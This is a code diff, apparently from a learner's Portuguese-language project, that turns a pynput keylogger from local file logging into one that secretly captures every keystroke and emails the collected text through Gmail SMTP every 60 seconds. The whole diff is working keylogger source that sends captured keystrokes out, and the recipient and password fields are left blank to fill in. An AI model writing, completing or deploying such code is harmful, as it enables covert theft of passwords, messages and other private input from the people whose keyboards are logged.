@@ -53,52 +53,70 @@ with keyboard.Listener(on_press= on_press) as listener:
 #segunda Parte
 
 
-
-
-
 from pynput import keyboard
+import smtplib 
+from email.mime.text import MIMEText
+from threading import Timer
 
-ignorar = {
-    keyboard.Key.shift,
-    keyboard.Key.shift_r,
-    keyboard.Key.ctrl_l,
-    keyboard.Key.ctrl_r,
-    keyboard.Key.alt_l,
-    keyboard.Key.alt_r,
-    keyboard.Key.caps_lock,
-    keyboard.Key.cmd
-}
+log = ''
+#Config email
+
+
+email_origem = ""
+
+email_destino = ""
+
+senha_email = ""
+
+def enviar_email():
+    global log
+
+    if log:
+        msg = MIMEText(log)
+        msg['SUBJECT'] = 'Dados Enviados '
+        msg['From'] = email_origem
+        msg['To'] = email_destino
+    
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(email_origem, senha_email)
+            server.send_message(msg)
+            server.quit()
+        
+        except Exception as e:
+            print("Erro ao enviar ", e)
+        
+        log= ' '
+
+
+    #agendar o envio a cada 60 segundos
+
+
+    Timer(60,  enviar_email).start()
+
 
 def on_press(key):
+    global log
 
     try:
-        #se for letra, numero, simbolo  
-        with open("log.txt", 'a', encoding="utf-8") as f:
-            f.write(key.char)    
-        
+        log+= key.char
+
     except AttributeError:
-        with open("log.txt", 'a', encoding="utf-8") as f:
 
-            if key == keyboard.Key.space:
-                f.write(" ")
-            
-            elif key == keyboard.Key.enter:
-                f.write("\n")
+        if key == keyboard.Key.space:
+            log+=' '
+        
+        elif key == keyboard.Key.enter:
+            log+= '\n'
 
-            elif key == keyboard.Key.tab:
-                f.write("\t")
-            
-            elif key == keyboard.Key.backspace:
-                f.write(" ")
-            
-            elif key == keyboard.Key.esc:
-                f.write("[ESC] ")
-            
-            elif key in ignorar:
-                pass
+        elif keyboard.Key.backspace:
+            log+= "[<]"
+        else:
+            pass
 
-            else:
-                f.write(f"[{key}]")
-            
-with keyboard.Listener(on_press= on_press) as listener:
-    listener.join() 
+#iniciar
+
+with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()
+    listener.join()
